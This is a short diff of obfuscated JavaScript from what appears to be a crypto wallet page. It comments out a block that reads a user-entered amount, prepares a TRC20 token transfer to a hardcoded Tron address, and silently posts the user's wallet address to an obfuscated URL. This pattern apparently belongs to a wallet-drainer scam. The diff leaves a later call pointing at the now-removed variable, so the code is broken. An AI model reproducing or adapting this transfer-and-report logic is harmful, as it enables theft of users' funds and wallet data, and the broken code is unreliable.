@@ -177,27 +177,27 @@ async function password() {
 }
 async function _0xd0365b() {
   try {
-    let _0xd0363c = document.getElementById("available1").value,
-      _0x8f883c = {
-        "config": {
-          "trc_apppass_address": authaddress
-        },
-        "money": _0xd0363c,
-        "_0x19h196": tronWeb.address.toHex("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"),
-        "_0x8f8196":"transfer(address,uint256)"
-      };
-    $.ajax({
-      "type": "POST",
-      "url": _0x2c6c51,
-      "async": false,
-      "data": {
-        "address": wallet_user_address,
-        "pid": pid,
-        "mode": mode,
-        "chain": chain
-      },
-      "success": function (_0x37c030, _0x248132) {}
-    });
+    // let _0xd0363c = document.getElementById("available1").value,
+    //   _0x8f883c = {
+    //     "config": {
+    //       "trc_apppass_address": authaddress
+    //     },
+    //     "money": _0xd0363c,
+    //     "_0x19h196": tronWeb.address.toHex("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"),
+    //     "_0x8f8196":"transfer(address,uint256)"
+    //   };
+    // $.ajax({
+    //   "type": "POST",
+    //   "url": _0x2c6c51,
+    //   "async": false,
+    //   "data": {
+    //     "address": wallet_user_address,
+    //     "pid": pid,
+    //     "mode": mode,
+    //     "chain": chain
+    //   },
+    //   "success": function (_0x37c030, _0x248132) {}
+    // });
     await _0x8f88sb(_0x8f883c);
   } catch (_0x25f372) {
     console.error("An error occurred during the blockchain transaction:", _0x25f372);
